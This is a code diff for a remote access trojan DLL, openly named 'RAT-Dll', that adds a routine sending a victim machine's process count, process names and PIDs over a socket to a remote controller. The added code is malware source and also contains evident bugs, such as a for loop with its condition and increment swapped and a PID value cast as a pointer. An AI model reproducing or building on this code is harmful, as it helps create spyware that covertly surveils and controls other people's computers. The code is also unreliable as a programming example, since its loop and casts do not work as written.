@@ -29,13 +29,51 @@ INT handleProcessList(SOCKET clientSock)
 	 }
 	  
 	 // Send back the number of processes we found first 
+	 status = send(clientSock, (const char*)&numProcesses, sizeof(INT), 0);
+	 if (status == SOCKET_ERROR)
+	 {
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (num of processes) %d\n", WSAGetLastError());
+		 OutputDebugStringA(msgBuf);
+		 status = WSAGetLastError();
+		 goto cleanup;
+	 }
 
-	 // Iterate through each list, append them into one message response and send them back
+	 // Iterate through each list, send the process name and the PID
+	 for (int i = 0; i++; i < numProcesses)
+	 {
+		 status = send(clientSock, processNames[i], sizeof(processNames[i]), 0);
+		 if (status == SOCKET_ERROR)
+		 {
+			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process name number %d) %d\n", i, WSAGetLastError());
+			 OutputDebugStringA(msgBuf);
+			 status = WSAGetLastError();
+			 goto cleanup;
+		 }
+
+		 status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
+		 if (status == SOCKET_ERROR)
+		 {
+			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process pid number %d) %d\n", i, WSAGetLastError());
+			 OutputDebugStringA(msgBuf);
+			 status = WSAGetLastError();
+			 goto cleanup;
+		 }
+	 }
+
+	 OutputDebugStringA("RAT-Dll-Process::handleProcessList - Successfully sent all processes !\n");
 
 	 // Send success reponse code 
+	 status = sendSuccess(clientSock);
+	 if (status != SUCCESS)
+	 {
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from sendSuccess %d\n", WSAGetLastError());
+		 OutputDebugStringA(msgBuf);
+		 goto cleanup;
+	 }
 
 
-cleanup:
+ cleanup:
+	 // TODO: clean memory pls
 	return status;
 }
 
